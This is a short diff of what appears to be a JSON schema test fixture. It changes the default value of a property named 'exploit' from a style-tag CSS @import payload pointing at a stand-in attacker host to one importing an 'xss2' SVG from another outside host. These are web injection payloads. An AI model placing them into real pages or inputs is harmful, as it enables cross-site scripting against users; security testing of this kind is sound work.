@@ -11,7 +11,7 @@
       "properties": {
         "exploit": {
           "type": "string",
-          "default": "<style>@import 'http://attacker.com/malicious.css';</style>"
+          "default": "<style>@import 'http://me6.com/aem/xss2.svg';</style>"
         }
       }
     }
